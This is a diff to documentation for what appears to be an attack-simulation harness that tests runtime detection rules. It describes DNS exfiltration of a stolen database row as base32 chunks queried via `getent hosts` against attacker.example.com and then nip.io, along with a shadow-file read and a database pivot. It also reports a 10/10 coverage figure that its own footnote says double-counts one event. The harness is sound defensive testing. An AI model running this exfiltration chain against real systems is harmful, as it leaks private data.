@@ -146,33 +146,43 @@ section "How to unblind".
 
 - **s6-dns-exfil-of-stolen-row** — same primitive, different sink.
   After extracting the row, perl base32-encodes it and slices into
-  30-char DNS labels. One `getent hosts <chunk>.attacker.example.com`
-  per chunk. With `networkEventsStreaming: enable` each lookup
-  becomes an R0005 alert with the encoded label visible in
-  `alert.labels.address` — operators see the leaked bytes in the
-  SIEM, not just an anomaly count.
+  30-char DNS labels. One `getent hosts <chunk>.1.1.1.1.nip.io`
+  per chunk (nip.io is a public wildcard resolver — any subdomain
+  of `<a.b.c.d>.nip.io` resolves to a.b.c.d, so every chunk is a
+  guaranteed-resolvable DNS query that `trace_dns` observes).
+  Each lookup produces one R0005 alert with the encoded label
+  visible in `alert.labels.address` — operators see the leaked
+  bytes in the SIEM, not just an anomaly count.
 
-Expected output (extended; 6/12 = same DETECTED set + 2 new R0001
-perl detections from s5/s6, all 4 new BLINDs map to the same operator
-knobs):
+Expected output (extended; 10/10 — every expected detection lands
+in alertmanager now that the chain targets real public destinations
+(s4 → 1.1.1.1, s6 → `*.1.1.1.1.nip.io`) and the network knobs are
+on):
 
 ```
 SCENARIO                              RULE    CONTAINER  COMM    STATUS
 s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
 s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
 s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
-s3-pivot-redis-as-pg-client           R0011   redis              BLIND
+s3-pivot-redis-as-pg-client           R0011   redis              DETECTED*
 s4-exfil-to-internet                  R0001   redis      perl    DETECTED
-s4-exfil-to-internet                  R0005   redis              BLIND
-s4-exfil-to-internet                  R0011   redis              BLIND
+s4-exfil-to-internet                  R0011   redis              DETECTED
 s5-pivot-pg-protocol-extract-row      R0001   redis      perl    DETECTED
-s5-pivot-pg-protocol-extract-row      R0011   redis              BLIND
+s5-pivot-pg-protocol-extract-row      R0011   redis              DETECTED*
 s6-dns-exfil-of-stolen-row            R0001   redis      perl    DETECTED
-s6-dns-exfil-of-stolen-row            R0005   redis              BLIND
-s6-dns-exfil-of-stolen-row            R0011   redis              BLIND
+s6-dns-exfil-of-stolen-row            R0005   redis              DETECTED
 
-Coverage: 6 / 12 expected detections matched
+Coverage: 10 / 10 expected detections matched
 ```
+
+`*` The matcher attributes any `(rule_id, container_name)` alert to
+every expectation that shares that pair. Only s4 produces a genuine
+R0011 event (1.1.1.1:80); the s3 and s5 R0011 expectations get
+counted against that same event. R0011's expression filters private
+IPs by design, so internal pivots can never produce a unique R0011
+alert. The s6 R0005 expectations are not subject to this — every
+chunk fires its own R0005 with the base32 label in
+`alert.labels.address`.
 
 Requires `chain.yaml` to set `POSTGRES_HOST_AUTH_METHOD=trust` on
 chain-postgres (already configured in this branch). The basic chain
